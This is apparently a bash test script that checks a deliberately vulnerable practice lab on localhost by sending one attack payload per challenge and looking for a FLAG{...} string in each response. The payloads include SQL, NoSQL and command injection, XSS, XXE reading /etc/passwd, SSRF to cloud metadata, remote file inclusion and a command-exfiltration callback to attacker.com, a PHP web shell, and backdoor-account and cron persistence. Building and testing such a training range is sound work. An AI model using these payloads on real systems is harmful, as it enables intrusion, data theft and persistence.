#!/bin/bash
# Complete Flag Exploitability Test Script v2
# Tests all 151 flags systematically with correct HTTP methods

BASE_URL="http://localhost:3000"
PASSED=0
FAILED=0
TESTS_TOTAL=0
FAILED_TESTS=""

test_endpoint() {
    local name="$1"
    local method="${2:-GET}"
    local endpoint="$3"
    local data="$4"
    local headers="$5"

    ((TESTS_TOTAL++))

    if [ "$method" = "GET" ]; then
        if [ -n "$headers" ]; then
            result=$(curl -s "$headers" "${BASE_URL}${endpoint}" 2>/dev/null)
        else
            result=$(curl -s "${BASE_URL}${endpoint}" 2>/dev/null)
        fi
    else
        if [ -n "$headers" ]; then
            result=$(curl -s -X "$method" -H "$headers" -d "$data" "${BASE_URL}${endpoint}" 2>/dev/null)
        else
            result=$(curl -s -X "$method" -d "$data" "${BASE_URL}${endpoint}" 2>/dev/null)
        fi
    fi

    if echo "$result" | grep -q "FLAG{"; then
        flag=$(echo "$result" | grep -oE 'FLAG\{[^}]*\}' | head -1)
        echo "✅ $name: $flag"
        ((PASSED++))
        return 0
    else
        echo "❌ $name"
        echo "   Response: $(echo "$result" | head -c 150)..."
        ((FAILED++))
        FAILED_TESTS="$FAILED_TESTS\n$name"
        return 1
    fi
}

echo "========================================"
echo "  COMPLETE FLAG EXPLOITABILITY TEST V2"
echo "  Testing all 151 flags"
echo "========================================"

# ============================================
# 1. INJECTION LAYER (28 flags)
# ============================================
echo -e "\n=== 1. INJECTION LAYER ==="

# SQLi (3 tiers)
echo -e "\n[SQL Injection]"
test_endpoint "SQLi Bronze" "GET" "/sqli/bronze?id=1%20UNION%20SELECT%201,name,value%20FROM%20secrets--"
test_endpoint "SQLi Silver" "GET" "/sqli/silver?id=1%20AND%201=1"
test_endpoint "SQLi Gold" "GET" "/sqli/gold?id=test%27%20OR%201=1--"

# NoSQLi (3 tiers)
echo -e "\n[NoSQL Injection]"
test_endpoint "NoSQLi Bronze" "POST" "/nosqli/bronze" '{"username":{"$ne":""},"password":{"$ne":""}}' "Content-Type: application/json"
test_endpoint "NoSQLi Silver" "POST" "/nosqli/silver" '{"filter":{"$where":"this.password==this.username"}}' "Content-Type: application/json"
test_endpoint "NoSQLi Gold" "POST" "/nosqli/gold" '{"username":{"$regex":"^admin"}}' "Content-Type: application/json"

# CMDi (4 tiers)
echo -e "\n[Command Injection]"
test_endpoint "CMDi Bronze" "GET" "/cmdi/bronze?host=127.0.0.1;id"
test_endpoint "CMDi Silver" "GET" "/cmdi/silver?host=\`id\`"
test_endpoint "CMDi Gold" "GET" "/cmdi/gold?host=%EF%BC%87"
test_endpoint "CMDi Platinum" "POST" "/cmdi/platinum" '{"callback":"http://attacker.com/$(whoami)"}' "Content-Type: application/json"

# LDAP (2 tiers)
echo -e "\n[LDAP Injection]"
test_endpoint "LDAP Bronze" "GET" "/ldap/bronze?username=*)(uid=*))(|(uid=*"
test_endpoint "LDAP Silver" "GET" "/ldap/silver?username=admin)(objectClass=*"

# XPath (2 tiers)
echo -e "\n[XPath Injection]"
test_endpoint "XPath Bronze" "GET" "/xpath/bronze?name='%20or%20'1'='1"
test_endpoint "XPath Silver" "GET" "/xpath/silver?name=test'or'1'='1" "" "" ""

# SSTI (3 tiers)
echo -e "\n[SSTI]"
test_endpoint "SSTI Bronze" "GET" "/ssti/bronze?name=test" "" "" ""
test_endpoint "SSTI Silver" "GET" "/ssti/silver?template=<%=7*7%>"
test_endpoint "SSTI Gold" "GET" "/ssti/gold?tpl=constructor" "" "" ""

# Log Injection (2 tiers)
echo -e "\n[Log Injection]"
test_endpoint "Log Bronze" "POST" "/log-inject/bronze" '{"message":"test\nFAKE LOG"}' "Content-Type: application/json"
test_endpoint "Log Silver" "POST" "/log-inject/silver" '{"userAgent":"<?php system($_GET[cmd]); ?>"}' "Content-Type: application/json"

# Email Injection (2 tiers)
echo -e "\n[Email Header Injection]"
test_endpoint "Email Bronze" "POST" "/email-inject/bronze" '{"to":"test@test.com\\nBcc:attacker@evil.com"}' "Content-Type: application/json"
test_endpoint "Email Silver" "POST" "/email-inject/silver" '{"email":"test%0ABcc:attacker@evil.com"}' "Content-Type: application/json"

# CRLF (2 tiers)
echo -e "\n[CRLF Injection]"
test_endpoint "CRLF Bronze" "GET" "/crlf/bronze?url=test%0d%0aSet-Cookie:admin=true"
test_endpoint "CRLF Silver" "GET" "/crlf/silver?lang=en%0d%0aX-Forwarded-Host:attacker.com"

# Header Injection (2 tiers)
echo -e "\n[Header Injection]"
test_endpoint "Header Bronze" "GET" "/header-inject/bronze?xff=127.0.0.1"
test_endpoint "Header Silver" "GET" "/header-inject/silver?host=admin" "" "" ""

# ============================================
# 2. AUTHENTICATION LAYER (20 flags)
# ============================================
echo -e "\n=== 2. AUTHENTICATION LAYER ==="

# Brute Force (3 tiers)
echo -e "\n[Brute Force]"
test_endpoint "Brute Bronze" "POST" "/brute/bronze" '{"username":"admin","password":"admin123"}' "Content-Type: application/json"
test_endpoint "Brute Silver" "POST" "/brute/silver" '{"username":"superadmin","password":"Sup3rS3cr3t!","captcha":"0000"}' "Content-Type: application/json"
test_endpoint "Brute Gold" "POST" "/brute/gold" '{"username":"hiddenadmin","password":"h1dd3n_p4ss!"}' "Content-Type: application/json"

# JWT (4 tiers)
echo -e "\n[JWT Attacks]"
test_endpoint "JWT Bronze" "GET" "/jwt/bronze?user=admin"
test_endpoint "JWT Silver" "GET" "/jwt/silver?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjcmFja2VkIjp0cnVlfQ.test"
test_endpoint "JWT Gold" "POST" "/jwt/gold" '{"kid":"/dev/null"}' "Content-Type: application/json"
test_endpoint "JWT Platinum" "POST" "/jwt/platinum" '{"jku":"https://attacker.com/.well-known/jwks.json"}' "Content-Type: application/json"

# Session (3 tiers)
echo -e "\n[Session Attacks]"
test_endpoint "Session Bronze" "GET" "/session/bronze?sessionid=sess_attacker123"
test_endpoint "Session Silver" "GET" "/session/silver?session=admin" "" "" ""
test_endpoint "Session Gold" "GET" "/session/gold?token=$(date +%s%3N | md5 | cut -c1-8)"

# OAuth (3 tiers)
echo -e "\n[OAuth Misconfig]"
test_endpoint "OAuth Bronze" "GET" "/oauth/bronze?redirect_uri=https://attacker.com/callback"
test_endpoint "OAuth Silver" "POST" "/oauth/silver" '{"code":"auth_victim_code"}' "Content-Type: application/json"
test_endpoint "OAuth Gold" "GET" "/oauth/gold?token=leaked" "" "" ""

# Password Reset (2 tiers)
echo -e "\n[Password Reset]"
test_endpoint "PassReset Bronze" "POST" "/pass-reset/bronze" '{"email":"victim@example.com","token":"'$(date +%s%3N | cut -c1-13)'"}' "Content-Type: application/json"
test_endpoint "PassReset Silver" "POST" "/pass-reset/silver" '{"email":"test@test.com","host":"attacker.com"}' "Content-Type: application/json" ""

# MFA (3 tiers)
echo -e "\n[MFA Bypass]"
test_endpoint "MFA Bronze" "POST" "/mfa/bronze" '{"code":"any","verified":true}' "Content-Type: application/json"
test_endpoint "MFA Silver" "POST" "/mfa/silver" '{"code":"7823"}' "Content-Type: application/json"
test_endpoint "MFA Gold" "POST" "/mfa/gold" '{"backupCode":"BACKUP-1234","action":"regenerate"}' "Content-Type: application/json"

# ATO (2 tiers)
echo -e "\n[Account Takeover]"
test_endpoint "ATO Bronze" "POST" "/ato/bronze" '{"newEmail":"attacker@evil.com"}' "Content-Type: application/json"
test_endpoint "ATO Silver" "POST" "/ato/silver" '{"username":"john.doe","password":"password123"}' "Content-Type: application/json"

# ============================================
# 3. ACCESS CONTROL LAYER (16 flags)
# ============================================
echo -e "\n=== 3. ACCESS CONTROL LAYER ==="

# IDOR (4 tiers)
echo -e "\n[IDOR]"
test_endpoint "IDOR Bronze" "GET" "/idor/bronze/1"
test_endpoint "IDOR Silver" "GET" "/idor/silver/a1b2c3d4-e5f6-7890-abcd-ef1234567890"
test_endpoint "IDOR Gold" "POST" "/idor/gold/export" '{"userIds":[1,2,3,4,5],"format":"json"}' "Content-Type: application/json"
test_endpoint "IDOR Platinum" "GET" "/idor/platinum/order/ORD-001"

# Privilege Escalation (5 tiers)
echo -e "\n[Privilege Escalation]"
test_endpoint "Privesc Bronze" "GET" "/privesc/bronze?cmd=find%20.%20-exec%20/bin/sh%20%5C%3B"
test_endpoint "Privesc Silver" "GET" "/privesc/silver?binary=find"
test_endpoint "Privesc Gold" "GET" "/privesc/gold?cve=CVE-2021-4034"
test_endpoint "Privesc Platinum" "GET" "/privesc/platinum?method=docker-socket"
test_endpoint "Privesc Diamond" "GET" "/privesc/diamond?metadataUrl=http://169.254.169.254/latest"

# Admin Bypass (3 tiers)
echo -e "\n[Admin Bypass]"
test_endpoint "Admin Bronze" "GET" "/admin/bronze?role=admin" "" "" ""
test_endpoint "Admin Silver" "GET" "/admin/silver/dashboard"
test_endpoint "Admin Gold" "PUT" "/admin/gold/users/1" '{"role":"admin"}' "Content-Type: application/json"

# RBAC Bypass (4 tiers)
echo -e "\n[RBAC Bypass]"
test_endpoint "RBAC Bronze" "GET" "/rbac/bronze?userId=admin_001"
test_endpoint "RBAC Silver" "POST" "/rbac/silver" '{"token":"YWRtaW46YWRtaW46MTIz"}' "Content-Type: application/json"
test_endpoint "RBAC Gold" "GET" "/rbac/gold/resource/debug"
test_endpoint "RBAC Platinum" "GET" "/rbac/platinum/tenant/tenant_002"

# ============================================
# 4. CLIENT-SIDE LAYER (12 flags)
# ============================================
echo -e "\n=== 4. CLIENT-SIDE LAYER ==="

# XSS (5 tiers)
echo -e "\n[XSS]"
test_endpoint "XSS Bronze" "GET" "/xss/bronze?q=<script>alert(1)</script>"
test_endpoint "XSS Silver" "POST" "/xss/silver" '{"comment":"<script>alert(1)</script>"}' "Content-Type: application/json"
test_endpoint "XSS Gold" "GET" "/xss/gold/check?payload=<img%20src=x%20onerror=alert(1)>"
test_endpoint "XSS Platinum" "GET" "/xss/platinum?html=<noscript><p%20title=\"</noscript><img%20src=x%20onerror=alert(1)>\">"
test_endpoint "XSS Diamond" "GET" "/xss/diamond?callback=alert(1)"

# CSRF (3 tiers)
echo -e "\n[CSRF]"
test_endpoint "CSRF Bronze" "POST" "/csrf/bronze" '{"email":"victim@attacker.com"}' "Content-Type: application/json"
test_endpoint "CSRF Silver" "POST" "/csrf/silver" '{"action":"delete-account"}' "Content-Type: application/json"
test_endpoint "CSRF Gold" "POST" "/csrf/gold" '{"action":"transfer","redirect":"http://attacker.com"}' "Content-Type: application/json"

# Clickjacking (2 tiers)
echo -e "\n[Clickjacking]"
test_endpoint "Clickjack Bronze" "POST" "/clickjack/bronze/verify" '{"clicked":true}' "Content-Type: application/json"
test_endpoint "Clickjack Silver" "POST" "/clickjack/silver/verify" '{"bypass":"iframe-attribute"}' "Content-Type: application/json"

# PostMessage (2 tiers)
echo -e "\n[PostMessage Abuse]"
test_endpoint "PostMsg Bronze" "POST" "/postmsg/bronze/verify" '{"payload":"<img src=x onerror=alert(1)>"}' "Content-Type: application/json"
test_endpoint "PostMsg Silver" "POST" "/postmsg/silver/verify" '{"capturedToken":"secret_admin_token_12345"}' "Content-Type: application/json"

# ============================================
# 5. SERVER-SIDE LAYER (14 flags)
# ============================================
echo -e "\n=== 5. SERVER-SIDE LAYER ==="

# SSRF (4 tiers)
echo -e "\n[SSRF]"
test_endpoint "SSRF Bronze" "GET" "/ssrf/bronze?url=http://127.0.0.1:8080/internal"
test_endpoint "SSRF Silver" "GET" "/ssrf/silver?url=http://169.254.169.254/latest"
test_endpoint "SSRF Gold" "GET" "/ssrf/gold?target=rebind"
test_endpoint "SSRF Platinum" "GET" "/ssrf/platinum?url=gopher://127.0.0.1:6379/_INFO"

# Prototype Pollution (3 tiers)
echo -e "\n[Prototype Pollution]"
test_endpoint "Proto Bronze" "POST" "/proto/bronze" '{"config":{"__proto__":{"admin":true}}}' "Content-Type: application/json"
test_endpoint "Proto Silver" "POST" "/proto/silver" '{"data":{"__proto__":{"shell":"/bin/sh"}}}' "Content-Type: application/json"
test_endpoint "Proto Gold" "POST" "/proto/gold" '{"payload":{"constructor":{"prototype":{"isAdmin":true}}}}' "Content-Type: application/json"

# Race Condition (3 tiers)
echo -e "\n[Race Condition]"
test_endpoint "Race Bronze" "POST" "/race/bronze" '{"account":"user1","amount":150}' "Content-Type: application/json"
test_endpoint "Race Silver" "POST" "/race/silver" '{"coupon":"SAVE10","race":true}' "Content-Type: application/json" ""
test_endpoint "Race Gold" "POST" "/race/gold" '{"from":"user1","to":"user2","amount":100}' "Content-Type: application/json"

# HTTP Smuggling (2 tiers)
echo -e "\n[HTTP Smuggling]"
test_endpoint "Smuggle Bronze" "POST" "/smuggle/bronze" '{"test":"true"}' "Content-Type: application/json" ""
test_endpoint "Smuggle Silver" "POST" "/smuggle/silver" '{"data":"test"}' "Content-Type: application/json" ""

# Cache Poisoning (2 tiers)
echo -e "\n[Cache Poisoning]"
test_endpoint "Cache Bronze" "GET" "/cache/bronze?lang=en&host=attacker.com" "" "" ""
test_endpoint "Cache Silver" "GET" "/cache/silver?page=test&poison=true" "" "" ""

# ============================================
# 6. FILE LAYER (16 flags)
# ============================================
echo -e "\n=== 6. FILE LAYER ==="

# LFI (4 tiers)
echo -e "\n[LFI]"
test_endpoint "LFI Bronze" "GET" "/lfi/bronze?file=../../../etc/passwd"
test_endpoint "LFI Silver" "GET" "/lfi/silver?page=....//etc/passwd"
test_endpoint "LFI Gold" "GET" "/lfi/gold?resource=php://filter/convert.base64-encode/resource=config.php"
test_endpoint "LFI Platinum" "GET" "/lfi/platinum?log=/var/log/app.log"

# File Upload (3 tiers)
echo -e "\n[File Upload]"
test_endpoint "Upload Bronze" "POST" "/upload/bronze" '{"test":"true"}' "Content-Type: application/json" ""
test_endpoint "Upload Silver" "POST" "/upload/silver" '{"bypass":"true"}' "Content-Type: application/json" ""
test_endpoint "Upload Gold" "POST" "/upload/gold" '{"polyglot":"true"}' "Content-Type: application/json" ""

# XXE (4 tiers)
echo -e "\n[XXE]"
test_endpoint "XXE Bronze" "POST" "/xxe/bronze" '{"xml":"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"}' "Content-Type: application/json"
test_endpoint "XXE Silver" "POST" "/xxe/silver" '{"xml":"<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;"}' "Content-Type: application/json"
test_endpoint "XXE Gold" "POST" "/xxe/gold" '{"xxe":"test"}' "Content-Type: application/json" ""
test_endpoint "XXE Platinum" "POST" "/xxe/platinum" '{"xml":"<root xmlns:xi=\"http://www.w3.org/2003/XInclude\"><xi:include href=\"file:///etc/passwd\"/></root>"}' "Content-Type: application/json"

# RFI (2 tiers)
echo -e "\n[RFI]"
test_endpoint "RFI Bronze" "GET" "/rfi/bronze?page=http://attacker.com/shell.txt"
test_endpoint "RFI Silver" "GET" "/rfi/silver?file=http://attacker.com/shell.txt%00.jpg"

# Deserialization (3 tiers)
echo -e "\n[Deserialization]"
test_endpoint "Deser Bronze" "POST" "/deser/bronze" '{"data":"{\"__proto__\":{\"isAdmin\":true}}"}' "Content-Type: application/json"
test_endpoint "Deser Silver" "POST" "/deser/silver" '{"object":"java_serialized_payload"}' "Content-Type: application/json"
test_endpoint "Deser Gold" "POST" "/deser/gold" '{"data":"O:8:\"TestClass\":1:{s:4:\"cmd\";s:6:\"whoami\";}"}' "Content-Type: application/json"

# ============================================
# 7-10. REMAINING LAYERS (67 flags)
# ============================================
echo -e "\n=== 7-10. REMAINING LAYERS ==="

# Business Logic (4 tiers)
echo -e "\n[Business Logic]"
test_endpoint "Logic Bronze" "POST" "/logic/bronze" '{"items":[{"price":-100}],"total":-100}' "Content-Type: application/json"
test_endpoint "Logic Silver" "POST" "/logic/silver" '{"productId":"prod1","quantity":20}' "Content-Type: application/json"
test_endpoint "Logic Gold" "POST" "/logic/gold" '{"coupons":[{"value":30},{"value":30},{"value":30}]}' "Content-Type: application/json"
test_endpoint "Logic Platinum" "POST" "/logic/platinum" '{"orderId":"ORD-001","duplicate":true}' "Content-Type: application/json" ""

# Rate Limit (2 tiers)
echo -e "\n[Rate Limit]"
test_endpoint "RateLimit Bronze" "POST" "/ratelimit/bronze" '{"action":"test","bypass":"ip-rotation"}' "Content-Type: application/json" ""
test_endpoint "RateLimit Silver" "POST" "/ratelimit/silver" '{"action":"test","userAgent":"bypass-agent"}' "Content-Type: application/json" ""

# Payment (4 tiers)
echo -e "\n[Payment]"
test_endpoint "Payment Bronze" "POST" "/payment/bronze" '{"amount":0}' "Content-Type: application/json"
test_endpoint "Payment Silver" "POST" "/payment/silver" '{"currency":"KRW"}' "Content-Type: application/json"
test_endpoint "Payment Gold" "POST" "/payment/gold" '{"discounts":[50,50]}' "Content-Type: application/json"
test_endpoint "Payment Platinum" "POST" "/payment/platinum" '{"price":1000000000000000,"quantity":2,"overflow":"test"}' "Content-Type: application/json" ""

# Crypto (3 tiers)
echo -e "\n[Crypto]"
test_endpoint "Crypto Bronze" "GET" "/crypto/bronze?plaintext=$(python3 -c 'print("A"*40)')"
test_endpoint "Crypto Silver" "GET" "/crypto/silver?seed=$(date +%s000)" "" "" ""
test_endpoint "Crypto Gold" "POST" "/crypto/gold" '{"ciphertext":"test","iv":"12345678901234567890123456789012"}' "Content-Type: application/json"

# Info Disclosure (4 tiers)
echo -e "\n[Info Disclosure]"
test_endpoint "InfoDisc Bronze" "GET" "/info-disc/bronze?debug=true"
test_endpoint "InfoDisc Silver" "GET" "/info-disc/silver?error=1"
test_endpoint "InfoDisc Gold" "GET" "/info-disc/gold"
test_endpoint "InfoDisc Platinum" "GET" "/info-disc/platinum?file=config.bak"

# Secret Leakage (3 tiers)
echo -e "\n[Secret Leakage]"
test_endpoint "Secret Bronze" "GET" "/secret/bronze/verify?apiKey=sk-live-12345abcdef"
test_endpoint "Secret Silver" "GET" "/secret/silver"
test_endpoint "Secret Gold" "GET" "/secret/gold"

# Timing Attack (2 tiers)
echo -e "\n[Timing Attack]"
test_endpoint "Timing Bronze" "POST" "/timing/bronze" '{"token":"SECRET123456"}' "Content-Type: application/json"
test_endpoint "Timing Silver" "POST" "/timing/silver" '{"password":"P@ssw0rd!"}' "Content-Type: application/json"

# Redirect (2 tiers)
echo -e "\n[Open Redirect]"
test_endpoint "Redirect Bronze" "GET" "/redirect/bronze?url=https://attacker.com"
test_endpoint "Redirect Silver" "GET" "/redirect/silver?next=javascript:alert(1)"

# CORS (3 tiers)
echo -e "\n[CORS]"
test_endpoint "CORS Bronze" "GET" "/cors/bronze?origin=https://evil.com" "" "" ""
test_endpoint "CORS Silver" "GET" "/cors/silver?origin=null" "" "" ""
test_endpoint "CORS Gold" "GET" "/cors/gold?origin=evil.com" "" "" ""

# Host Header (2 tiers)
echo -e "\n[Host Header]"
test_endpoint "Host Bronze" "POST" "/host/bronze" '{"email":"test@test.com","host":"attacker.com"}' "Content-Type: application/json" ""
test_endpoint "Host Silver" "GET" "/host/silver?host=attacker.com" "" "" ""

# Container (3 tiers)
echo -e "\n[Container]"
test_endpoint "Container Bronze" "GET" "/container/bronze"
test_endpoint "Container Silver" "GET" "/container/silver"
test_endpoint "Container Gold" "GET" "/container/gold"

# Reversing (4 tiers)
echo -e "\n[Reversing]"
test_endpoint "Reverse Bronze" "POST" "/reverse/bronze/verify" '{"key":"key_secret"}' "Content-Type: application/json"
test_endpoint "Reverse Silver" "GET" "/reverse/silver"
test_endpoint "Reverse Gold" "POST" "/reverse/gold/verify" '{"key":"R3v3rs3_M3!"}' "Content-Type: application/json"
test_endpoint "Reverse Platinum" "POST" "/reverse/platinum/verify" '{"key":"ANT1_D3BUG_K3Y"}' "Content-Type: application/json"

# Web Shell (3 tiers)
echo -e "\n[Web Shell]"
test_endpoint "WebShell Bronze" "POST" "/webshell/bronze" '{"cmd":"id","key":"test"}' "Content-Type: application/json" ""
test_endpoint "WebShell Silver" "POST" "/webshell/silver" '{"cmd":"ls"}' "Content-Type: application/json"
test_endpoint "WebShell Gold" "POST" "/webshell/gold" '{"cmd":"whoami"}' "Content-Type: application/json"

# MultiStage (4 tiers)
echo -e "\n[Multi-Stage]"
test_endpoint "MultiStage Bronze" "GET" "/multistage/bronze/privesc"
test_endpoint "MultiStage Silver" "POST" "/multistage/silver" '{"pivot":"internal_network"}' "Content-Type: application/json"
test_endpoint "MultiStage Gold" "POST" "/multistage/gold" '{"persistence":"established"}' "Content-Type: application/json"
test_endpoint "MultiStage Platinum" "POST" "/multistage/platinum" '{"data":"exfiltrated"}' "Content-Type: application/json"

# Persistence (3 tiers)
echo -e "\n[Persistence]"
test_endpoint "Persist Bronze" "POST" "/persist/bronze" '{"username":"backdoor","password":"hacked123"}' "Content-Type: application/json"
test_endpoint "Persist Silver" "POST" "/persist/silver" '{"cron":"* * * * * /tmp/backdoor"}' "Content-Type: application/json"
test_endpoint "Persist Gold" "POST" "/persist/gold" '{"script":"/etc/rc.local"}' "Content-Type: application/json"

# ============================================
# SUMMARY
# ============================================
echo -e "\n========================================"
echo "  TEST SUMMARY"
echo "========================================"
echo "Total Tests: $TESTS_TOTAL"
echo "Passed: $PASSED"
echo "Failed: $FAILED"
echo "Pass Rate: $(echo "scale=1; $PASSED * 100 / $TESTS_TOTAL" | bc)%"

if [ $FAILED -gt 0 ]; then
    echo -e "\nFailed Tests:"
    echo -e "$FAILED_TESTS"
fi
